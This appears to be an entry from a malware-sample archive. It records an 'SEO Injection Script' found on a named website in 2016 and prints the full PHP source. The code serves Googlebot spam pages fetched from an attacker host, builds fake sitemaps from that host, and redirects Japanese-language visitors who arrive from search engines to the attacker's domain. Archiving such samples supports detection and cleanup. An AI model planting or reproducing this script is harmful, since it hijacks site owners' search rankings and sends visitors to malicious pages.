<!--
	Detected: 2016.11.02 on southeastconnection.ca 
	Description: SEO Injection Script
-->

<!-- Original Code -->
<?php
if(!function_exists("stripos"))
{
	function stripos($str,$needle,$offset=0)
	{
	  return strpos(strtolower($str),strtolower($needle),$offset);
	}
}
$isoldpage=isoldpage();
$uy= $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$u = explode('?ja-',$uy);
$isBot = isGoogleBot();
$isJa = isJaBrower();
$referer = $_SERVER['HTTP_REFERER'];
if(trim($_SERVER['QUERY_STRING'])=="sitemap.xml"){
	$url = "http://html.2016win.win/v1/siteurls.php?".$u[0];
	ob_start(); 
	$url_str = GetFileContent($url);
	$contents=ob_get_contents(); 
	ob_end_clean(); 
	$arrayUrls = explode("|",$url_str);
	$dom=new DomDocument('1.0', 'utf-8');
	$urlset = $dom->createElement('urlset');
	$dom->appendChild($urlset); 
	$xmlns = $dom->createAttribute("xmlns");
	$urlset->appendChild($xmlns);
	$xmlnsvalue = $dom->createTextNode("http://www.sitemaps.org/schemas/sitemap/0.9"); 
	$xmlns->appendChild($xmlnsvalue);
	foreach($arrayUrls as $k=>$v){
		$url = $dom->createElement("url");
		$urlset->appendChild($url);
		$loc = $dom->createElement("loc");
		$url->appendChild($loc);
		$text = $dom->createTextNode($v); 
		$loc->appendChild($text);
	}
	header("Content-type:text/xml; charset=utf-8");
	echo $dom->saveXML();
	exit;
}
if ($isBot){
    if(!$isoldpage){
		$queryid=$_SERVER['QUERY_STRING'];
		$str = GetFileContent("http://html.2016win.win/v1/proxy2.php?".$u[1]."|".$_SERVER['HTTP_HOST']);
		echo $str;
		exit;
	}else{
		$str=GetFileContent("http://html.2016win.win/v1/proxy.php?".$u[0]);
		echo $str;
		exit;
	}
}else if (isSpider($referer) && $isJa){
	echo '<script>document.location=("http://html.2016win.win/ny1.php?'.$uy.'");</script>';
	exit; 
}
function isGoogleBot(){
	if(stripos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false) return true;
	else return false;
}

function isJaBrower(){
	if(strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), "ja") !== false) return true;
	else return false;
}

function isSpider($referer){
	if(strpos(strtolower($referer), "google") !== false || strpos(strtolower($referer), "yahoo") !== false) return true;
	else return false;
}

function isoldpage(){
	if(strpos($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'],'?ja-') !== false) return false;
	else return true;
}
function GetFileContent($url){
		$ch = curl_init();
		$timeout = 30; 
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		$file_contents = curl_exec($ch);
		curl_close($ch);
	return $file_contents;
}
?>

<!-- Unminified/compressed code -->
<?php // Unneccessary ?>